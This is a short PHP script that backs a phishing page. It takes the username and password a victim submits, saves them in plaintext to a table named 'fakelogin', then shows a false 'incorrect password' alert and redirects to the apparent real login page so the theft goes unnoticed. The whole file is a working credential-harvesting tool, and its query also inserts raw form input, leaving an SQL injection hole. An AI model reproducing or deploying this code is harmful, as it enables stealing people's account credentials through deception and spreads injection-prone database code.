      <?php
      // Create connection
      require_once('conn.php');

      $username = "";
      $password = "";
        // Assigning POST values to variables.
        $username = $_POST['username'];
        $password = $_POST['password'];

        $sql = "INSERT into fakelogin (username,password,date) VALUES ('$username','$password',CURRENT_TIMESTAMP)";
        $result =  mysqli_query($connection, $sql);
        if ($result){
          echo "<script type='text/javascript'>alert('The username or password you entered is incorrect')
          window.location.href = '../SiteX/login.php?loginfailed';
         </script>";
        }
      ?>
